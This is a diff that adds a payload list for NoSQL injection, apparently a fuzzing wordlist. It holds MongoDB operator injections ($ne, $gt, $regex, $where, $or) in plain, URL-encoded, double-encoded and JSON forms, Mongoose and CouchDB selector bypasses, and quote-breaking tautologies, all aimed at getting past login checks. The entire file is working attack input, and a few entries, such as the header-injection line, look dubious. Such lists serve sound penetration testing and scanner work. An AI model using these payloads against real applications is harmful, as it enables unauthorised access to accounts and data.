@@ -1,0 +1,53 @@
+[$ne]=1
+[$gt]=
+[$gte]=
+[$lt]=z
+[$lte]=z
+[$in][]=admin
+[$nin][]=invalid
+[$exists]=true
+[$regex]=.*
+[$regex]=^
+[$ne][0]=invalid
+[$gt][0]=
+[$where]=1==1
+[$where]=this.username=='admin'
+[$or][0][username]=admin
+[$or][0][password][$gt]=
+[username][$ne]=&[password][$ne]=
+[username][$regex]=.*&[password][$regex]=.*
+username[$ne]=null&password[$ne]=null
+username[$gt]=&password[$gt]=
+username[$exists]=true&password[$exists]=true
+username[$in][]=admin&password[$gt]=
+{$ne: null}
+{$gt: ''}
+{$regex: '.*'}
+{$exists: true}
+[password][$regex]=.*
+[username][$ne]=invalid&[password][$gt]=0
+admin'||'a'=='a
+admin" || "a"=="a
+admin" || true || "
+# URL-encoded operator injection
+%5busername%5d%5b%24ne%5d=invalid&%5bpassword%5d%5b%24ne%5d=invalid
+%5b%24ne%5d=1&%5b%24gt%5d=
+username%5b%24ne%5d=invalid&password%5b%24ne%5d=invalid
+username%5b%24regex%5d=.*&password%5b%24regex%5d=.*
+# Double URL-encoded
+%255busername%255d%255b%2524ne%255d=invalid
+# JSON body operator injection
+{"username":{"$ne":"x"},"password":{"$ne":"x"}}
+{"username":{"$in":["admin","root"]},"password":{"$gt":""}}
+{"username":{"$regex":".*admin.*"},"password":{"$exists":true}}
+# Mongoose bypass
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":{"$gte":""},"password":{"$gte":""}}
+# CouchDB operator bypass
+{"selector":{"$or":[{"username":"admin"},{"username":{"$gt":""}}]}}
+{"selector":{"_id":{"$gt":""}}}
+# Header injection for operator bypass
+Content-Type: application/json; {"username":{"$ne":null}}
+# PHP magic quotes bypass (when PHP mongo driver used)
+username[%24ne]=&password[%24ne]=
+username[%24regex]=.%2a&password[%24exists]=true
